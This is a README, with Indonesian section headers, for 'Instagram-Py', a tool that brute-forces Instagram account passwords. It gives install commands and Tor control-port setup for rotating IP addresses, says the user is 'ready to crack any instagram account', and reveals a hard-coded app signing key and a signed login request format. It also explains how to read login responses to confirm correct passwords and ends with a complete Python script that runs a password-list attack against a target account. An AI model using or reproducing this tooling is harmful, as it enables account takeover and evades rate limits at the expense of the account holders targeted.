-------------------------------------------------- CARA PAKAI --------------------------------------------------
Instalasi Upgrading Instagram-Py dengan pip

$ sudo pip3 install instagram-py --upgrade $ sudo easy_install3 -U pip # you have to install python3-setuptools , update pip $ sudo pip3 install requests --upgrade $ sudo pip3 install requests[socks] $ sudo pip3 install stem $ sudo pip3 install instagram-py $ instagram-py # installed sukses $ instagram-py --create-configuration Configuring Instagram-Py

$ instagram-py --create-configuration $ # OR $ instagram-py -cc

$ instagram-py --create-configuration --default-configuration $ # OR $ instagram-py -cc -dc

Configuring Tor server to open control port

open your tor configuration file usually located at /etc/tor/torrc

$ sudo vim /etc/tor/torrc # open it with your text editor

search for the file for this specific section

The port on which Tor will listen for local connections from Tor
controller applications, as documented in control-spec.txt.
#ControlPort 9051

uncomment 'ControlPort' by deleting the # before 'ControlPort' , now save the file and restart your tor server

now you are ready to crack any instagram account , make sure your tor configuration matched ~/instapy-config.json Usage

Finally , now you can use instagram-py!

Instagram-Py Scripting lets you run Custom Python Scripts Inside Instagram-Py!

Never Run Instagram-Py with Multiple Instance! , Use Instagram-Py Scripting Instead!

$ instagram-py -u your_account_username -pl path_to_password_list

Note: Without the -c optional argument , instagram-py will not continue the attack

usage: instagram-py [-h] [--username USERNAME] [--password-list PASSWORD_LIST] [--script SCRIPT] [--inspect-username INSPECT_USERNAME] [--create-configuration] [--default-configuration] [--countinue] [--verbose]

optional arguments: -h, --help show this help message and exit --username USERNAME, -u USERNAME username for Instagram account --password-list PASSWORD_LIST, -pl PASSWORD_LIST password list file to try with the given username. --script SCRIPT, -s SCRIPT Instagram-Py Attack Script. --inspect-username INSPECT_USERNAME, -i INSPECT_USERNAME Username to inspect in the instagram-py dump. --create-configuration, -cc Create a Configuration file for Instagram-Py with ease. --default-configuration, -dc noconfirm for Instagram-Py Configuration Creator! --countinue, -c Countinue the previous attack if found. --verbose, -v Activate Verbose mode. ( Verbose level )

example: instagram-py -c -vvv -u instatestgod__ -pl rockyou.txt

Report bug, suggestions and new features at https://github.com/awanvenom/bobol_ig

Instagram-Py Scripting

Instagram-Py now lets you run your custom scripts inside of it for maximum customization of your attacks. This Scripts are simple Python Scripts ( You Can just do anything that is possible with python )

You Can Always View the Cracked Passwords Using this command!

$ instagram-py -i instatestgod__ $ # Displays record if it is cracked in the past!

Algorithm

Instagram-Py uses a very simple algorithm for checking passwords efficiently , this section is dedicated for those who wish to recreate this program in any other language.

You can see this live when you run the tool in max verbosity

$ instagram-py -vvv -u instatestgod__ -pl password_list.lst

You can also use Instagram-Py as a module , so that you can also use it in your script What we do

Step 1: Get the magic cookie , which is used to verify device integrity!

Getting the magic cookie is the simplest job , all we need to do is send a get request to https://i.instagram.com/api/v1/si/fetch_headers/?challenge_type=signup&guid= , where the guid get parameter is a random 32 character string. The random 32 character string can be generator using python's simple uuid library , to be specific v4 of UUID. So finally we just have to request the url https://i.instagram.com/api/v1/si/fetch_headers/?challenge_type=signup&guid=800e88b931bf491fa3b4a7afa4e679eb and get the cookie named csrftoken , if we observe the response header we could see that our cookie only expires next year the same day. So by this we only have to make this request once and can use it for a year! How vulnerable is that?...

Step 2: Build a post request with Instagram's signature.

This part is simple but may be difficult to setup , first i need to get instagram's signature which is only present in their free apk from google play , Remember our Strength can be our Weakness , All i have to do reverse engineer the apk and find the signature, lets call it ig_sig.

ig_sig = 4f8732eb9ba7d1c8e8897a75d6474d4eb3f5279137431b2aafb71fafe2abe178 ig_version = 4

Instagram uses HMAC Authentication for login stuff, so lets use python's hmac library. But first we have to build our body which will be encoded in json for it to actually sign with ig_sig , So the post body looks likes this...

phone_id = <RANDOM 32 CHARACTER STRING SEPERATED WITH - on EQUAL INTERVALS> _csrftoken = <THE MAGIC COOKIE THAT WE GOT!> username = guid = <RANDOM 32 CHARACTER STRING SEPERATED WITH - on EQUAL INTERVALS> device_id = android-<RANDOM 16 CHARACTER STRING> password = login_attempt_count = 0

The above will be encoded to JSON , So to test the password we have to post the data to this url https://i.instagram.com/api/v1/accounts/login/ig_sig_key_version=4&signed_body=. .

: using HMAC , sign our json encoded data with ig_sig and return a hexa value.

: the same data in json but we url encode so that it goes properly to insta!

So to test a account with username as USERNAME and password with PASSWORD we simply request this url https://i.instagram.com/api/v1/accounts/login/ig_sig_key_version=4&signed_body=bc90e1b7d430f39152e92b4e7d517bfb231dbe0515ed2071dc784cf876e301c3.%7B%22phone_id%22%3A%20%2232abb45c-f605-4fd7-9b5e-674115516b90%22%2C%20%22_csrftoken%22%3A%20%22PyMH2niVQrk41UIBW0lKilleG7GylluQ%22%2C%20%22username%22%3A%20%22USERNAME%22%2C%20%22guid%22%3A%20%2267ca220c-a9eb-4240-b173-2d253808904d%22%2C%20%22device_id%22%3A%20%22android-283abce46cb0a0bcef4%22%2C%20%22password%22%3A%20%22PASSWORD%22%2C%20%22login_attempt_count%22%3A%20%220%22%7D

Step 3: With the json response and response code , we determine the password is correct or wrong.

if We get response 200 then the login is success but if we get response 400 , We inspect the json data for clues if it is the correct password or invalid request or too many tries. So we inspect the message from instagram json response!

Message = Challenge Required , then the password is correct but instagram got some questions so we must wait until the user logs in and answer the question and if we are lucky they will not change the password and we could login in later(Most of the time people won't change the password!)

Message = The password you entered is incorrect. , then the password is incorrect for sure , try another.

Message as something like word invalid in it then , some other error so just try again, can happen because of wordlist encoding error which i ignored because all the worldlist have encoding error!

Message = Too many tries , Time to change our ip and loop but we don't want to change our magic cookie

Contribute anything you can to this repo (Issues | Pull request) , help is much appreciated.

Please Refer CONTRIBUTING for more information on contributing!

Using Instagram-Py as API

Instagram-Py supports to be used as a module as of v1.3.2 , so you don't want to reproduce my code. Just use it!

For some reason you wish not to use my software then you can use my software as a module and embed into your own software , anyway its native so its just gonna run the same as the official command-line tool unless you do something crazy.

Follow the same installation method mentioned above to install Instagram-Py API.

This is a simple script to conduct a bructe force attack using instagram-py as a API.

#!/usr/bin/env python3 ''' This is the same thing that is in the init file of the command-line tool. ''' from InstagramPy.InstagramPyCLI import InstagramPyCLI from InstagramPy.InstagramPySession import InstagramPySession , DEFAULT_PATH from InstagramPy.InstagramPyInstance import InstagramPyInstance from datetime import datetime

username = "TARGET ACCOUNT USERNAME" password = "PASSWORD LIST PATH"

appInfo = { "version" : "0.0.1", "name" : "Instagram-Py Clone", "description" : "Some Module to crack instagram!", "author" : "YourName", "company" : "YourCompany", "year" : "2017", "example" : "" }

cli = InstagramPyCLI(appinfo = appInfo , started = datetime.now() , verbose_level = 3)

'''

USE THIS IF YOU WANT
cli.PrintHeader() cli.PrintDatetime() ''' session = InstagramPySession(username , password , DEFAULT_PATH , DEFAULT_PATH , cli) session.ReadSaveFile(True) # True to countinue attack if found save file. '''

USE THIS IF YOU WANT
cli.PrintMagicCookie(session.magic_cookie) '''

''' Defining @param cli = None will make Instagram-Py run silently so you can you use your own interface if you like. or if you want to use the official interface then declare like this

instagrampy = InstagramPyInstance(cli = cli , session = session)

'''

instagrampy = InstagramPyInstance(cli = None ,session = session) while not instagrampy.PasswordFound(): print('Trying... '+session.CurrentPassword()) instagrampy.TryPassword()

if instagrampy.PasswordFound(): print('Password Found: '+session.CurrentPassword())

exit(0)
